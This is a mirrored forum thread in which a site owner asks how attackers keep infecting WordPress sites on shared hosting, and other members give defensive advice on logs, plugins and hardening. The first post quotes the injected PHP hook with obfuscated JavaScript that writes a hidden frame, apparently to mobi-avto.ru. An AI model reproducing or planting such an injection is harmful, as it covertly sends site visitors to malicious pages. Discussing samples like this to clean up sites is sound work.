<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en" id="vbulletin_html">

<!-- Mirrored from garage4hackers.com/printthread.php?t=6267&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 16:33:21 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
	<base  /><!--[if IE]></base><![endif]-->
	<meta name="generator" content="vBulletin 4.2.1" />

	
	<link rel="stylesheet" type="text/css" href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" />
	



	<title> Wordpress malware through backdoor?</title>
	<link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />

</head>
<body>

<div class="above_body">
<div id="header" class="floatcontainer">
<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
</div>
</div>
<div class="body_wrapper">
<div id="pagetitle">
	<h1><a href="showthread9ca2.html?t=6267">Wordpress malware through backdoor?</a></h1>
	<p class="description">Printable View</p>
</div>



<ul id="postlist">
	<li class="postbit blockbody" id="post_1">
	<div class="header">
		<div class="datetime">05-31-2015, 07:45 PM</div>
		<span class="username">shiyashamsu</span>
	</div>
	
	
		<div class="title">Wordpress malware through backdoor?</div>
	
	<div class="content">
		<blockquote class="restore">Hello,<br />
<br />
Two types of malware attacks encountered in last 2 months for my site. The first was modification of .htaccess file to add redirection to malware site mobi-avto.ru for mobile users. I cleaned the .htaccess file for about 6 times after repeated attack and now it is stopped and detected a new one. When we load the site there were hidden requests sent to mobi-avto.ru and a couple of other sites, possibly for obtaining impressions or traffic? The infected file was wp-includes/default-filters.php, the malware code was added before the penultimate line. <br />
<div class="bbcode_container">
	<div class="bbcode_description">Quote:</div>
	<div class="bbcode_quote printable">
		<hr />
		
			function Kgspy_xig(){echo'&lt;script type=&quot;text/javascript&quot;&gt;var Petm_phw=[723,783,823,828,841,755,838,839,844,831,824,784,75  7,835,834,838,828,839,828,834,833,781,755,820,821,  838,834,831,840,839,824,782,755,831,824,825,839,78  1,768,772,771,771,760,782,755,839,834,835,781,771,  760,782,755,842,828,823,839,827,781,772,771,771,76  0,782,755,827,824,828,826,827,839,781,772,771,771,  760,782,757,785,783,828,825,837,820,832,824,755,83  8,839,844,831,824,784,757,842,828,823,839,827,781,  772,771,771,760,782,827,824,828,826,827,839,781,77  2,771,771,760,757,755,842,828,823,839,827,784,757,  772,771,771,760,757,755,838,822,837,834,831,831,82  8,833,826,784,757,833,834,757,755,825,837,820,832,  824,821,834,837,823,824,837,784,757,833,834,757,75  5,832,820,837,826,828,833,842,828,823,839,827,784,  757,771,757,755,832,820,837,826,828,833,827,824,82  8,826,827,839,784,757,771,757,755,838,837,822,784,  757,827,839,839,835,781,770,770,832,834,821,828,76  8,820,841,839,834,769,837,840,770,837,770,820,831,  835,827,820,757,785,783,770,828,825,837,820,832,82  4,785,783,770,823,828,841,785];var Cgane_wbw=&quot;&quot;;for (var i=0; i&lt;Petm_phw.length; i++) {Cgane_wbw+=String.fromCharCode(Petm_phw[i]-Petm_phw[0]);} document.write(Cgane_wbw);&lt;/script&gt;';}<br />
add_action('wp_footer',Kgspy_xig);
			
		<hr />
	</div>
</div><br />
Please advise, how the attacker is getting access to my filesystem and how to prevent this.<br />
<br />
Thanks in advance</blockquote>
	</div>
</li><li class="postbit blockbody" id="post_2">
	<div class="header">
		<div class="datetime">06-01-2015, 03:35 AM</div>
		<span class="username">b0nd</span>
	</div>
	
	
	<div class="content">
		<blockquote class="restore">Hi,<br />
<br />
Sadly the attacker is already in and anytime playing with files making his/her intentions realistic. <br />
First let us know is your website on shared hosting or on VPS? Thereafter further strategy could be planned in better way.<br />
<br />
Cheers!</blockquote>
	</div>
</li><li class="postbit blockbody" id="post_3">
	<div class="header">
		<div class="datetime">06-01-2015, 07:22 AM</div>
		<span class="username">shiyashamsu</span>
	</div>
	
	
	<div class="content">
		<blockquote class="restore">Yes Bond, it is on a Shared Hosting and we have more than 10 add on domains also. All of them were affected in the same way.</blockquote>
	</div>
</li><li class="postbit blockbody" id="post_4">
	<div class="header">
		<div class="datetime">06-01-2015, 02:57 PM</div>
		<span class="username">b0nd</span>
	</div>
	
	
	<div class="content">
		<blockquote class="restore">In that case, possibly, intrusion happened from either of them and attacker later escalated privileges to 'root' and is free to edit any file on any domain. Anyway, let bygones be bygones...<br />
<br />
A clean system has to be developed now. But would be next to impossible until weakness is found. Got log files to find intrusion? Until and unless attacker has wiped his/her traces, you should be able to find intrusion in logs (could be tiresome job though).<br />
Once it's done, patching of vulnerability, followed by clean system setup &amp; hardening of server + applications is recommended.<br />
<br />
Feel free to discuss.<br />
<br />
Cheers</blockquote>
	</div>
</li><li class="postbit blockbody" id="post_5">
	<div class="header">
		<div class="datetime">06-01-2015, 05:28 PM</div>
		<span class="username">shiyashamsu</span>
	</div>
	
	
	<div class="content">
		<blockquote class="restore">Well, I have asked hosting support to investigate and identify the backdoor. It is 2 days and they have just replied not to change anything :D , until their clean up is completed. They even recommended Sitelock security for preventing further attacks. The cPanel error log seems to be empty and access logs are quite large, seems that I need to search it for a hint :)<br />
<br />
Meanwhile, let me also wait what hosting guys come up with. Regarding hardening the server, we need to discuss with them and suggest things.<br />
<br />
Will update the progress.<br />
<br />
Thanks!</blockquote>
	</div>
</li><li class="postbit blockbody" id="post_6">
	<div class="header">
		<div class="datetime">06-03-2015, 05:31 PM</div>
		<span class="username">shiyashamsu</span>
	</div>
	
	
	<div class="content">
		<blockquote class="restore">It is day 3 and support is yet to update lol !!</blockquote>
	</div>
</li><li class="postbit blockbody" id="post_7">
	<div class="header">
		<div class="datetime">06-04-2015, 01:14 PM</div>
		<span class="username">41.w4r10r</span>
	</div>
	
	
	<div class="content">
		<blockquote class="restore"><div class="bbcode_container">
	<div class="bbcode_description">Quote:</div>
	<div class="bbcode_quote printable">
		<hr />
		
			<div>
				Originally Posted by <strong>shiyashamsu</strong>
				<a href="showthreadb5f4-2.html?p=13905#post13905" rel="nofollow"><img class="inlineimg" src="images/buttons/viewpost.html" alt="View Post" /></a>
			</div>
			<div class="message">It is day 3 and support is yet to update lol !!</div>
			
		<hr />
	</div>
</div>Thats how shared hosting generally works :(<br />
<br />
by the time they find out the issue you can also start looking out for plugins you have installed on your domains and any recent vulnerability disclosed for them to find possible ways of intrusion ;)</blockquote>
	</div>
</li><li class="postbit blockbody" id="post_8">
	<div class="header">
		<div class="datetime">07-31-2015, 04:21 PM</div>
		<span class="username">metahuman</span>
	</div>
	
	
	<div class="content">
		<blockquote class="restore">Have you installed any pirated plugins?</blockquote>
	</div>
</li><li class="postbit blockbody" id="post_9">
	<div class="header">
		<div class="datetime">10-25-2016, 01:35 PM</div>
		<span class="username">whatl0ol</span>
	</div>
	
	
	<div class="content">
		<blockquote class="restore">okay so first just test plugins you installed there is chance attacker exploits with vlnerable plugins,most popular way to hack wordpress is vulnerable adn     up to date plugins.i will analyze js code and submit more detailed answer</blockquote>
	</div>
</li>
</ul>


</div>
<div class="below_body">
<div id="footer_time" class="footer_time">All times are GMT +5.5. The time now is <span class="time">05:07 PM</span>.</div>

<div id="footer_copyright" class="footer_copyright">
	<!-- Do not remove this copyright notice -->
	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
	<!-- Do not remove this copyright notice -->	
</div>
<div id="footer_morecopyright" class="footer_morecopyright">
	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
	
	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
	Copyright 2010 - 2017, Garage4Hackers
</div>
 
</div>

<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
try{
var pageTracker = _gat._getTracker('UA-17311051-3');
pageTracker._trackPageview();
} catch(err) {}</script>
</body>

<!-- Mirrored from garage4hackers.com/printthread.php?t=6267&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 16:33:21 GMT -->
</html>